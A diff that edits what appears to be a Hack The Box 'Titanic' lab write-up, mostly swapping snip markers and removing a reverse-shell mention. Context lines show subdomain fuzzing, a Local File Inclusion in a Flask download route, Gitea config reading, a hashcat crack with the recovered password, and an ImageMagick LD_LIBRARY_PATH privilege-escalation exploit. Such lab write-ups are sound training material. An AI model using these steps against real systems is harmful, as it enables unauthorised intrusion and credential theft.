@@ -27,7 +27,7 @@ ffuf -u "http://titanic.htb" -H "Host: FUZZ.titanic.htb" \
 ```
 
 ```
-<SNIP>
+...
 dev                     [Status: 200, Size: 13982, Words: 1107, Lines: 276, Duration: 94ms]
 :: Progress: [4989/4989] :: Job [1/1] :: 232 req/sec :: Duration: [0:00:24] :: Errors: 0 ::
 ```
@@ -68,7 +68,7 @@ Checking the contents of the `gitea/docker-compose.yml` file reveals the full di
 
 ```yaml
 version: '3'
-<SNIP>
+...
     ports:
       - "127.0.0.1:3000:3000"
       - "127.0.0.1:2222:22"  # Optional for SSH access
@@ -95,7 +95,7 @@ import json
 from uuid import uuid4
 
 app = Flask(__name__)
-<SNIP>
+...
 ```
 
 Taking a look at the `download_ticket()` function under the `/download` route, we can see that the application uses the `path.join()` function from the `os` library insecurely, thus creating a **Local File Inclusion** vulnerability on the web service:
@@ -159,7 +159,7 @@ docker exec -it 42dd801487a3 bash
 │   └── log
 └── ssh
     ├── ssh_host_ecdsa_key
-<SNIP>
+...
 42dd801487a3:/data#
 ```
 
@@ -167,12 +167,12 @@ We can see a `gitea` folder inside the `/data` directory, which includes an `app
 
 ```bash
 42dd801487a3:/data/gitea/conf# cat app.ini
-<SNIP>
+...
 [database]          
 PATH = /data/gitea/gitea.db
 DB_TYPE = sqlite3      
 HOST    = localhost:3306
-<SNIP>
+...
 42dd801487a3:/data/gitea/conf#
 ```
 
@@ -231,7 +231,7 @@ We crack the PBKDF2 hash for the `developer` user using `hashcat` and retrieve i
 hashcat -m 10900 hashes.txt /usr/share/wordlists/rockyou.txt
 ```
 ```
-<SNIP>
+...
 sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
                                                           
 Session..........: hashcat
@@ -298,7 +298,7 @@ Checking the version of **ImageMagick**, we can see that it's `7.1.1-35`:
 developer@titanic:/opt/scripts$ magick --version
 Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
 Copyright: (C) 1999 ImageMagick Studio LLC
-<SNIP>
+...
 developer@titanic:/opt/scripts$
 ```
 
@@ -311,7 +311,7 @@ After conducting some research, we discover that this version of **ImageMagick**
 
 ### Root
 
-We use the steps from the above PoC to exploit **ImageMagick** in conjunction with `LD_LIBRARY_PATH` abuse and obtain a reverse shell as the `root` user. First we create a shared library in the `/opt/app/static/assets/images` directory, which is where the scripts runs from:
+We use the steps from the above PoC to exploit **ImageMagick** in conjunction with `LD_LIBRARY_PATH` abuse. First we create a shared library in the `/opt/app/static/assets/images` directory, which is where the scripts runs from:
 
 ```c
 gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
